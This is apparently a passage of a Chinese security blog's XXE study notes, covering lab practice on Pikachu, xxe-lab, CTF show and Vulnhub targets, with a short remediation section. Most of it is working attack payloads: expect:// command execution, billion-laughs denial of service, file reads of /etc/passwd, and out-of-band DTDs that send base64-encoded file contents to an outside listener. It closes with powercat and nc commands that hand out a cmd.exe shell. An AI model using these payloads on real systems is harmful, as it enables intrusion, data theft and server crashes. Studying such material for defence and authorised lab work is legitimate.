<h4 id="RCE-PHP-expect模块开启"><a href="#RCE-PHP-expect模块开启" class="headerlink" title="RCE : PHP expect模块开启"></a>RCE : PHP expect模块开启</h4><p>条件：安装 expect扩展的情况下，在PHP环境当中执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ELEMENT  ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description uid=0(root) gid=0(root) groups=0(root)...</span><br></pre></td></tr></table></figure>

<h4 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;     &lt;!DOCTYPE lolz [     &lt;!ENTITY lol &quot;lol&quot;&gt;     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;     ]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>

<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。</p>
<p>UNIX 下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>如果 XML 解析器尝试使用<code>/dev/random</code>文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
<h3 id="3-1-3-Pikachu"><a href="#3-1-3-Pikachu" class="headerlink" title="3.1.3 Pikachu"></a>3.1.3 Pikachu</h3><p><strong>读取文件（敏感）</strong></p>
<p>测试环境：Pikachu</p>
<p><strong>有回显</strong></p>
<p><strong>直接读取本地文件进行测验</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///d:/test.txt&quot;</span>&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;</span>&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p><strong>引入外部实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;http://xxe/1.dtd&quot;&gt;%file;]&gt;&lt;x&gt;&amp;send;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.dtd:&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt; </span><br></pre></td></tr></table></figure>

<p><strong>php伪协议</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p><strong>利用php扩展 expect 执行系统命令 — RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/xxe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>无回显</strong></p>
<p>Payload1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://xxe/4.dtd&quot;&gt;%dtd;%send;]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload;</span><br></pre></td></tr></table></figure>

<p>Payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999/?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>端口监听</strong></p>
<p><img src="https://i.loli.net/2021/10/01/E7ipC4frbYIVXBT.png" alt="image-20210430093026570"></p>
<p>日志的读取/文件的接收代码 或者是 开启端口监听</p>
<p><strong>日志查看</strong></p>
<p>环境：win-2003</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.158.115/xxe/3.dtd&quot;&gt;%dtd;%send;]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/v7K6L4nsfyYhGxm.png" alt="image-20210430094003726"></p>
<h3 id="3-1-4-xxe-lab"><a href="#3-1-4-xxe-lab" class="headerlink" title="3.1.4 xxe-lab"></a>3.1.4 xxe-lab</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-1-5-xlsx-文件攻击"><a href="#3-1-5-xlsx-文件攻击" class="headerlink" title="3.1.5 xlsx 文件攻击"></a>3.1.5 xlsx 文件攻击</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36093477/article/details/82849631">xlsx 文件上传</a></p>
<h2 id="3-2-绕过方式"><a href="#3-2-绕过方式" class="headerlink" title="3.2 绕过方式"></a>3.2 绕过方式</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">参考</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4059">https://xz.aliyun.com/t/4059</a></p>
<h2 id="3-3-检测"><a href="#3-3-检测" class="headerlink" title="3.3 检测"></a>3.3 检测</h2><ul>
<li><p>工具</p>
</li>
<li><p>人工</p>
<p>数据格式类型判断</p>
<p>Content-Type值判断 text/xml   application/xml</p>
<p>盲猜：更改Content-Type值尝试</p>
</li>
</ul>
<h2 id="3-4-工具"><a href="#3-4-工具" class="headerlink" title="3.4 工具"></a>3.4 工具</h2><p>XXEinjector(Ruby)</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lm2017/article/details/88394859">安装</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9614990.html">使用</a></p>
<h2 id="3-5-练题"><a href="#3-5-练题" class="headerlink" title="3.5 练题"></a>3.5 练题</h2><h3 id="3-5-1-CTF-show"><a href="#3-5-1-CTF-show" class="headerlink" title="3.5.1 CTF show"></a>3.5.1 CTF show</h3><p>373</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $ctfshow = $creds-&gt;ctfshow;    echo $ctfshow;&#125;highlight_file(__FILE__);    </span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>374</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag&quot;&gt;&lt;!ENTITY % hack SYSTEM &quot;http://xxe/test.dtd&quot;&gt;%hack;%dtd;%xxe;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.dtd:&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://xxe:3333/%file;&#x27;&gt; &quot;&gt;%dtd;%xxe;</span><br></pre></td></tr></table></figure>

<p>引用%hack后调用外部文件，后调用%dtd引入嵌套的payload后引用%xxe接收数据</p>
<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2语法：python -m SimpleHTTPServer python3语法：python -m http.server</span><br></pre></td></tr></table></figure>

<p>375</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;   	die(&#x27;error&#x27;); 	&#125; if(isset($xmlfile))&#123;   	$dom = new DOMDocument();   	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 	&#125; highlight_file(__FILE__);   </span><br></pre></td></tr></table></figure>

<p>376</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;, $xmlfile))&#123;    die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);   </span><br></pre></td></tr></table></figure>

<p>377</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;, $xmlfile))&#123;    die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);    </span><br></pre></td></tr></table></figure>

<h3 id="3-5-2-修改-Content-Type类型"><a href="#3-5-2-修改-Content-Type类型" class="headerlink" title="3.5.2 修改 Content-Type类型"></a>3.5.2 修改 Content-Type类型</h3><p>一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击。</p>
<p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">题目链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/MTmdcGnZlHxuNwi.png" alt="image-20210430104340700"></p>
<h3 id="3-5-3-引入本地-dtd-文件"><a href="#3-5-3-引入本地-dtd-文件" class="headerlink" title="3.5.3  引入本地 dtd 文件"></a>3.5.3  引入本地 dtd 文件</h3><p><a target="_blank" rel="noopener" href="https://bnv.web.ctfcompetition.com/">题目链接</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> <span class="meta-keyword">ANY</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234010123502402340<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE message [	&lt;!ENTITY % remote SYSTEM <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;	&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;	&lt;!ENTITY % ISOamso <span class="string">&#x27;		&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;		&amp;#x25;eval;		&amp;#x25;send;	&#x27;</span>&gt; 	%remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p>Exploiting XXE to retrieve data by repurposing a local DTD[2]</p>
<p>这个 payload 主要是利用 错误信息来打印目标文件的内容，重新定义了 <code>docbookx.dtd</code> （一般有 Gnome 就有它）里面的 <code>ISOamso</code>。我们提交了这个 payload 之后，当导入本地的 DTD 文件时，会优先执行我们定义的 <code>ISOamso</code>，因此可以达成任意文件读取。</p>
<h3 id="3-5-4-Vulnhub"><a href="#3-5-4-Vulnhub" class="headerlink" title="3.5.4 Vulnhub"></a>3.5.4 Vulnhub</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/">Vulnhub</a></p>
<p>确定 IP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:nmap -sS 192.168.158.0/24nmap -sV -p- 192.168.158.121</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/8g31avFJlDqxnAZ.png" alt="image-20210501191238334"></p>
<p>目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.158.121</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *Allow: /User-Agent: *Disallow: /xxe/*Disallow: /admin.php</span><br></pre></td></tr></table></figure>

<p>XXE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>admin.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   session_start();?&gt;&lt;html lang = &quot;en&quot;&gt;      &lt;head&gt;      &lt;title&gt;admin&lt;/title&gt;      &lt;link href = &quot;css/bootstrap.min.css&quot; rel = &quot;stylesheet&quot;&gt;            &lt;style&gt;         body &#123;            padding-top: 40px;            padding-bottom: 40px;            background-color: #ADABAB;         &#125;                  .form-signin &#123;            max-width: 330px;            padding: 15px;            margin: 0 auto;            color: #017572;         &#125;                  .form-signin .form-signin-heading,         .form-signin .checkbox &#123;            margin-bottom: 10px;         &#125;                  .form-signin .checkbox &#123;            font-weight: normal;         &#125;                  .form-signin .form-control &#123;            position: relative;            height: auto;            -webkit-box-sizing: border-box;            -moz-box-sizing: border-box;            box-sizing: border-box;            padding: 10px;            font-size: 16px;         &#125;                  .form-signin .form-control:focus &#123;            z-index: 2;         &#125;                  .form-signin input[type=&quot;email&quot;] &#123;            margin-bottom: -1px;            border-bottom-right-radius: 0;            border-bottom-left-radius: 0;            border-color:#017572;         &#125;                  .form-signin input[type=&quot;password&quot;] &#123;            margin-bottom: 10px;            border-top-left-radius: 0;            border-top-right-radius: 0;            border-color:#017572;         &#125;                  h2&#123;            text-align: center;            color: #017572;         &#125;      &lt;/style&gt;         &lt;/head&gt;	   &lt;body&gt;            &lt;h2&gt;Enter Username and Password&lt;/h2&gt;       &lt;div class = &quot;container form-signin&quot;&gt;                  &lt;?php            $msg = &#x27;&#x27;;            if (isset($_POST[&#x27;login&#x27;]) &amp;&amp; !empty($_POST[&#x27;username&#x27;])                &amp;&amp; !empty($_POST[&#x27;password&#x27;])) &#123;				               if ($_POST[&#x27;username&#x27;] == &#x27;administhebest&#x27; &amp;&amp;                   md5($_POST[&#x27;password&#x27;]) == &#x27;e6e061838856bf47e1de730719fb2609&#x27;) &#123;                  $_SESSION[&#x27;valid&#x27;] = true;                  $_SESSION[&#x27;timeout&#x27;] = time();                  $_SESSION[&#x27;username&#x27;] = &#x27;administhebest&#x27;;                                  echo &quot;You have entered valid use name and password &lt;br /&gt;&quot;;		$flag = &quot;Here is the &lt;a style=&#x27;color:FF0000;&#x27; href=&#x27;/flagmeout.php&#x27;&gt;Flag&lt;/a&gt;&quot;;		echo $flag;               &#125;else &#123;                  $msg = &#x27;Maybe Later&#x27;;               &#125;            &#125;         ?&gt;      &lt;/div&gt; &lt;!-- W00t/W00t --&gt;            &lt;div class = &quot;container&quot;&gt;               &lt;form class = &quot;form-signin&quot; role = &quot;form&quot;             action = &quot;&lt;?php echo htmlspecialchars($_SERVER[&#x27;PHP_SELF&#x27;]);             ?&gt;&quot; method = &quot;post&quot;&gt;            &lt;h4 class = &quot;form-signin-heading&quot;&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt;            &lt;input type = &quot;text&quot; class = &quot;form-control&quot;                name = &quot;username&quot;                required autofocus&gt;&lt;/br&gt;            &lt;input type = &quot;password&quot; class = &quot;form-control&quot;               name = &quot;password&quot; required&gt;            &lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot;                name = &quot;login&quot;&gt;Login&lt;/button&gt;         &lt;/form&gt;			         Click here to clean &lt;a href = &quot;adminlog.php&quot; tite = &quot;Logout&quot;&gt;Session.               &lt;/div&gt;          &lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="3-6-修复建议"><a href="#3-6-修复建议" class="headerlink" title="3.6 修复建议"></a>3.6 修复建议</h2><p>（1）禁止使用外部实体，例如 <code>libxml_disable_entity_loader(true)</code></p>
<p>（2）过滤用户提交的XML数据，防止出现非法内容，如关键词：&lt;!DOCTYPE和&lt;!ENTITY或者SYSTEM和PUBLIC等</p>
<p>（3）检查所使用的底层XML解析库，默认禁止外部实体的解析</p>
<p>（4）若使用第三方应用代码需要及时升级补丁</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactorydbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData= etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/walkwaters/p/12057566.html">nmap</a></p>
<h2 id="3-7-参考"><a href="#3-7-参考" class="headerlink" title="3.7 参考"></a>3.7 参考</h2><p>XXE : <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-17">https://xz.aliyun.com/t/3357#toc-17</a></p>
<p>XXE : <a target="_blank" rel="noopener" href="https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
<p>PHP-dom : <a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-xml-parser-expat.html">https://www.runoob.com/php/php-xml-parser-expat.html</a></p>
<p>菜鸟教程~XML： <a target="_blank" rel="noopener" href="https://www.runoob.com/xml/xml-tutorial.html">https://www.runoob.com/xml/xml-tutorial.html</a></p>
<p>菜鸟教程~DTD： <a target="_blank" rel="noopener" href="https://www.runoob.com/dtd/dtd-tutorial.html">https://www.runoob.com/dtd/dtd-tutorial.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/schema/schema-tutorial.html">XML Schema 菜鸟教程</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/156863.html">使用 XML Schema 攻击</a></p>
<p><a target="_blank" rel="noopener" href="http://www.anquanke.com/post/id/87481">XSLT 攻击 (xxe)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/AtesetEnginner/p/11261653.html">https://www.cnblogs.com/AtesetEnginner/p/11261653.html</a></p>
<p><img src="https://img2020.cnblogs.com/blog/2265061/202102/2265061-20210204114932441-1593681207.png" alt="img"></p>
<p>Windows上的powercat正向连接Kali上的nc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:192.168.158.111 nc -lvvp 4444 win-10:192.168.158.110 powercat -c 192.168.158.111 -p 4444 -e cmd.exe</span><br></pre></td></tr></table></figure>

<p>kali上的nc反向链接到windows上的powercat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:192.168.158.111 nc -vv 192.168.158.110 4444 win-10:192.168.158.110 powercat -l -p 4444 -e cmd.exe</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      
        <div id="donation_div"></div>


<script src="/js/vdonate.js"></script>

<script>
var a = new Donate({
  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
  btnText: 'Donate', // 可选参数，打赏按钮文字
  el: document.getElementById('donation_div'),
  wechatImage: 'https://i.loli.net/2021/07/09/UNXc5a6nbWxgzru.png',
  alipayImage: 'https://i.loli.net/2021/07/09/Sf9nJd8hkOypTar.png'
});
</script>
      
      
      <div>
        <ul class="post-copyright">
          <li class="post-copyright-author">
          <strong>Post author:  </strong>xizhi-future</a>
